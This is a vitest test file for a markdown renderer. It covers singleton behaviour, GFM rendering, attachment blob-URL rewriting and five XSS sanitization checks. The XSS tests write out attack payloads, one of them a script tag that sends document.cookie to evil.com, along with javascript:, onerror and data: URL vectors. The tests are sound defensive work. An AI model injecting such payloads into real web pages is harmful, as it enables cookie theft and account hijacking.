/**
 * NB-K2 — markdown-renderer singleton + 5 XSS attack scenarios.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import {
  getMarkdownRenderer,
  renderMarkdown,
  resolveAttachmentRefs,
  _resetRendererForTests,
} from '../markdown-renderer';

beforeEach(() => _resetRendererForTests());

describe('NB-K2 — getMarkdownRenderer singleton', () => {
  it('first call constructs an instance; second call returns same', async () => {
    const md1 = await getMarkdownRenderer();
    const md2 = await getMarkdownRenderer();
    expect(md1).toBe(md2);
  });

  it('html option disabled (parser-level XSS gate)', async () => {
    const md = await getMarkdownRenderer();
    expect(md.options.html).toBe(false);
  });
});

describe('NB-K2 — renderMarkdown basic CommonMark + GFM', () => {
  it('renders paragraphs / strong / italic', async () => {
    const html = await renderMarkdown('hello **world** _ok_');
    expect(html).toContain('<strong>world</strong>');
    expect(html).toContain('<em>ok</em>');
  });

  it('renders tables', async () => {
    const html = await renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<table>');
    expect(html).toContain('<th>a</th>');
  });

  it('renders task lists', async () => {
    const html = await renderMarkdown('- [ ] todo\n- [x] done');
    expect(html).toMatch(/<input[^>]*type="checkbox"/);
  });

  it('renders ==highlight==', async () => {
    const html = await renderMarkdown('==yellow==');
    expect(html).toContain('<mark>yellow</mark>');
  });
});

describe('NB-K2 — three-layer XSS sanitization (no executable HTML survives)', () => {
  // For each vector we check that no EXECUTABLE attack survives. Plain
  // text containing the words is fine because it's escaped — the
  // browser will render "document.cookie" as text, not run JS.
  it('XSS-1: script injection — no <script> tag in output', async () => {
    const text = '<script>fetch("https://evil.com/?cookie="+document.cookie)</script>';
    const html = await renderMarkdown(text);
    expect(html).not.toMatch(/<script[\s>]/i);
    expect(html).not.toContain('</script>');
  });

  it('XSS-2: javascript: URL — no href starting with javascript:', async () => {
    const text = '[click](javascript:alert("xss"))';
    const html = await renderMarkdown(text);
    expect(html).not.toMatch(/href\s*=\s*["']?javascript:/i);
  });

  it('XSS-3: onerror image — no executable onerror attribute', async () => {
    const text = '<img src="x" onerror="alert(1)">';
    const html = await renderMarkdown(text);
    // markdown-it html:false escapes the whole thing → plain text.
    // The literal word "onerror" may appear inside escaped text, which
    // is safe; the executable attribute is what we ban.
    expect(html).not.toMatch(/<img[^>]*\bonerror\s*=/i);
  });

  it('XSS-4: data: HTML URL — no href starting with data:text/html', async () => {
    const text = '[link](data:text/html,<script>alert(1)</script>)';
    const html = await renderMarkdown(text);
    expect(html).not.toMatch(/href\s*=\s*["']?data:text\/html/i);
  });

  it('XSS-5: CSS expression — no style attribute containing javascript:', async () => {
    const text = '<div style="background: url(javascript:alert(1))">x</div>';
    const html = await renderMarkdown(text);
    expect(html).not.toMatch(/style\s*=\s*["'][^"']*javascript:/i);
  });
});

describe('NB-K2 — resolveAttachmentRefs', () => {
  it('rewrites <img src="att01.png"> to blob URL when registered', () => {
    const html = '<p>before</p><img src="att01.png" alt="gel"><p>after</p>';
    const attachments = new Map([
      ['att01', { blobUrl: 'blob:http://localhost/abc-123' }],
    ]);
    const rewritten = resolveAttachmentRefs(html, attachments);
    expect(rewritten).toContain('blob:http://localhost/abc-123');
    expect(rewritten).toContain('data-att-id="att01"');
  });

  it('marks missing attachment with data-att-missing="true"', () => {
    const html = '<img src="attMISSING.png" alt="x">';
    const attachments = new Map();
    const rewritten = resolveAttachmentRefs(html, attachments);
    expect(rewritten).toContain('data-att-missing="true"');
  });

  it('passes html through when no attachments map provided', () => {
    const html = '<p>x</p>';
    expect(resolveAttachmentRefs(html, null)).toBe(html);
  });
});

describe('NB-K2 — full pipeline integration', () => {
  it('renders markdown with attachment reference end-to-end', async () => {
    const attachments = new Map([
      ['att01', { blobUrl: 'blob:http://localhost/gel-blob' }],
    ]);
    const html = await renderMarkdown(
      '## PCR result\n\n![gel](att01.png)\n\nVerified.',
      { attachments },
    );
    expect(html).toContain('<h2>');
    expect(html).toContain('blob:http://localhost/gel-blob');
    expect(html).toContain('Verified');
  });
});
